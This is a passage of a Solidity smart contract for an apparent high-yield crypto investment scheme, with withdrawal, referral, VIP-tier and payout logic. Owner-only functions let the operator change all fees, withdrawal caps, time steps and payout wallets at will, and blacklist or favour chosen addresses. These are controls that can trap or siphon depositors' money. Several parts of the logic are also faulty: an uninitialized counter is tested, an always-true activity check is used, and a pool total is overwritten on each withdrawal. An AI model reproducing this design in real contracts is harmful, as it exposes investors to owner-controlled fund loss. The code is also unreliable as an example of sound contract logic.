                    revert("You are a vip investor and you cannot withdraw if the contract period has not ended");
                }
                
                uint256 amount_taxWithdrawWhale;
                uint256 amount_taxWithdrawVip;
                uint8 maxIncrementBonusDeposit;

                if(investor.bonus_deposit == true) {
                    if(investor.whithdrawCount > 1) {
                        investor.amount_bonus_deposit += 0;
                    }
                    maxIncrementBonusDeposit++;
                } else if (maxIncrementBonusDeposit > 5) {
                        investor.bonus_deposit = false;
                        investor.amount_bonus_deposit  = 0;
                } else {
                    investor.amount_bonus_deposit  = 0;
                }

                uint256 bonusAmount = investor.dividends * investor.amount_bonus_deposit / 1e18;
                uint256 amount = investor.dividends + bonusAmount + investor.match_bonus;
                uint256  insurance_amt =  amount * secure_fee/(PERCENTS_DIVIDER);
                secure_wallet.transfer(insurance_amt);
                amount = amount - insurance_amt;

                require(amount >= MIN_WITHDRAW, "Investor does not have the withdrawal minimum");
                
                if (investorvip.vip == true && amount > MAX_WITHDRAW) {
                    investorvip.FeeWithdrawStatus = true;
                } if (investorvip.FeeWithdrawStatus == false && amount > MAX_WITHDRAW && !iswhitelist(msg.sender)) {
                    investor.dividends = amount - MAX_WITHDRAW;
                    amount = MAX_WITHDRAW;
                    if (investor.whithdrawCount >= MAX_TaxWITHDRAW_COUNT) {
                    investor.statusTaxWithdraw = true;
                    }
                } if (iswhitelist(msg.sender)) {
                    investor.statusTaxWithdraw = false;
                    amount = amount + (amount * PRC_PARTN / PERCENTS_DIVIDER);
                } if (investorvip.FeeWithdrawStatus == true) {
                    if (investorvip.FeeWithdraw > 0) {
                    amount_taxWithdrawVip = amount * investorvip.FeeWithdraw / (PERCENTS_DIVIDER);
                    amount = amount - amount_taxWithdrawVip;
                    investorvip.vip = false;
                    investorvip.FeeWithdrawStatus = false;
                    investorvip.FeeWithdraw = 0;
                } } 
                if (investor.statusTaxWithdraw == true) {
                    amount_taxWithdrawWhale = amount * TaxWithdrawWhale / (PERCENTS_DIVIDER);
                    amount = amount - amount_taxWithdrawWhale;
                }
                
                investor.dividends = 0;
                investor.match_bonus = 0;
                uint256 amountTaxTotal = amount_taxWithdrawWhale + amount_taxWithdrawVip;

                uint256 reinvestAmount = amount * REINVEST_PERCENT / (PERCENTS_DIVIDER);
                investor.total_invested += reinvestAmount;
                invested += reinvestAmount;
                uint256 reinvestAmountTax =  reinvestAmount * secure_fee/(PERCENTS_DIVIDER);
		        emit NewDeposit(msg.sender, reinvestAmount, TimeReInvest);
                amount -= reinvestAmount;

                secure_wallet.transfer(amountTaxTotal + reinvestAmountTax);
                secure_pool = insurance_amt + amountTaxTotal + reinvestAmountTax;
                investor.total_withdrawn += amount;
                withdrawn += amount;

                investor.checkpoint = block.timestamp;
                payable(msg.sender).transfer(amount);
                
                emit Withdraw(msg.sender, amount);
                investor.whithdrawCount++;
            }

            function _payout(address _addr) private {
                uint256 payout = this.payoutOf(_addr);
                if(payout > 0) {
                    investors[_addr].last_payout = uint40(block.timestamp);
                    investors[_addr].dividends += payout;
                }
            }

            function _refPayout(address _addr, uint256 _amount) private {
                address up = investors[_addr].upline;
                uint256 reffCounts = investorsvip[up].reffCount;
                uint8 refBonusPosition;
                uint256 bonus;
                uint8 diss = 1;
                if(reffCounts <= 5 - diss) {
                    refBonusPosition = 0;
                } else if (reffCounts <= 10 - diss) {
                    refBonusPosition = 1;
                } else if (reffCounts <= 15 - diss) {
                    refBonusPosition = 2;
                } else if (reffCounts <= 20 - diss) {
                    refBonusPosition = 3;
                } else if (reffCounts >= 21 - diss) {
                    refBonusPosition = 4;
                }

                bonus = _amount * ref_bonuses[refBonusPosition] / PERCENT_DIVIDER;                   
                investors[up].match_bonus += bonus;
                investors[up].total_match_bonus += bonus;
                match_bonus += bonus;
                emit MatchPayout(up, _addr, bonus);
                investorsvip[up].reffCount++;
            }

            function _setUpline(address _addr, address _upline, uint256 _amount) private {
                if(investors[_addr].upline == address(0) || _addr != _owner) {
                    if(investors[_upline].deposits.length == 0) {
                        if(!isActiveInvestor(_addr) || _addr == _upline){
                            _upline = secure_wallet;
                        }
                    }
                    investors[_addr].upline = _upline;
                    emit Upline(_addr, _upline, _amount / 100);
                }
            }

            function payoutOf(address _addr) view external returns(uint256 value) {
             Investor storage investor = investors[_addr];
                for(uint256 i = 0; i < investor.deposits.length; i++) {
                Deposit storage dep = investor.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];

                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint40 from = investor.last_payout > dep.time ? investor.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

                if(from < to) {
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                    uint256 timeMultiplier =(block.timestamp - investor.checkpoint) / (TIME_STEP) * (PRC_BONUS_HOLDER); //1% per day
                    uint256 holdBonus = value * timeMultiplier / PERCENTS_DIVIDER;
                    value += holdBonus;    
                    }
                }
            return value;
            }
            
        function investorInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256 _reffCount, uint256 _checkpoint) {
                Investor storage investor = investors[_addr];
                uint256 payout = this.payoutOf(_addr);
                return (
                    payout + investor.dividends + investor.match_bonus,
                    investor.total_invested,
                    investor.total_withdrawn,
                    investor.total_match_bonus,
                    investorsvip[_addr].reffCount,
                    investor.checkpoint
                );
            }

            function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus,uint256 _initUNIX, uint256 _totalInvestors) {
                return (invested, withdrawn, match_bonus, initUNIX, totalInvestors);
            }

            function isActiveInvestor(address userAddress) public view returns (bool) {
            Investor storage investor = investors[userAddress];
            uint256 checkpointDeps = investorsvip[userAddress].checkpointDep;
            uint256 maxDaysContract = 24 * 86400;
            if (investor.deposits.length > 0 && checkpointDeps <= (checkpointDeps + maxDaysContract) ) {
                    return true;
                }
            return false;
            }

            function getContractBalance() public view returns (uint256) {
                return address(this).balance;
            }

            function PRC_Fees(uint256 value1, uint256 value2, uint256 value3, uint256 value4) external onlyOwner {
                secure_fee = value1;
                marketing_fee = value2;
                projectFee = value3;
                ceoFee = value4;
            }

            function Set_TimeStep(uint256 value) external onlyOwner {
                TIME_STEP = value;
            }

            function PRC_Partn(uint256 value) external onlyOwner {
                PRC_PARTN = value;
            }

            function Values_ReInvest(uint256 value1, uint8 value2) external onlyOwner {
                REINVEST_PERCENT = value1;
                TimeReInvest = value2;
            }

            function Set_BonusDeposit(uint256 value1, uint256 value2, uint256 value3) external onlyOwner {
                MAX_DEPOSIT_BONUS_STEP_TIME = value1;
                USER_DEPOSITS_STEP = value2;
                DEPOSIT_BONUS_PERCENT = value3;
            }

            function Set_ValueVip(uint256 value1, uint256 value2, uint256 value3, uint256 value4) external onlyOwner {
                VIP_TARIF = value1;
                VIP_TARIF_PRICE = value2;
                VIP_WITHDRAW_TIME_STEP = value3;
                VIP_FeeWithdraw = value4;
            }

            function Set_MinMax_Withdraw(uint256 value1, uint256 value2) external onlyOwner {
                MIN_WITHDRAW = value1;
                MAX_WITHDRAW = value2;
            }

            function Set_InvestMin(uint256 value) external onlyOwner {
                INVEST_MIN_AMOUNT = value;
            }
            
            function Set_TaxWhales(uint256 value1, uint256 value2, uint256 value3) external onlyOwner {
                TaxWithdrawWhale = value1;
                TaxDepositWhale = value2;
                MAX_TaxWITHDRAW_COUNT = value3;
            }

            function PRC_BonusHolder(uint256 value) external onlyOwner {
                PRC_BONUS_HOLDER = value;
            }

            function Change_Wllts(address value1, address value2, address value3, address value4) external onlyOwner {
                marketing_wallet = payable(value1);
                project = payable(value2);
                secure_wallet = payable(value3);
                ceo = payable(value4);
            }

            function isContract(address addr) internal view returns (bool) {
            uint256 size;
            assembly { size := extcodesize(addr) }
            return size > 0;
            }

            function donate() external payable returns(bool) {
            payable(_owner).transfer(msg.value);
            return true;
            }

            function injectLiquidity() external payable returns(bool) {
                return true;
            }

            function addBlacklist(address _address) public onlyOwner {
                blacklist[_address] = true;
            }

            function removeBlacklist(address _address) public onlyOwner {
                blacklist[_address] = false;
            }
            function isBlackListed(address _address) public view returns(bool) {
                return blacklist[_address];
            }

            modifier NonBlackListed() {
                require(!isBlackListed(msg.sender));
                _;
            }

            function SetWhitelist(address _address, bool _state) public onlyOwner {
                whitelist[_address] = _state;
            }

            function iswhitelist(address _address) public view returns(bool) {
                return whitelist[_address];
            }
        }
}
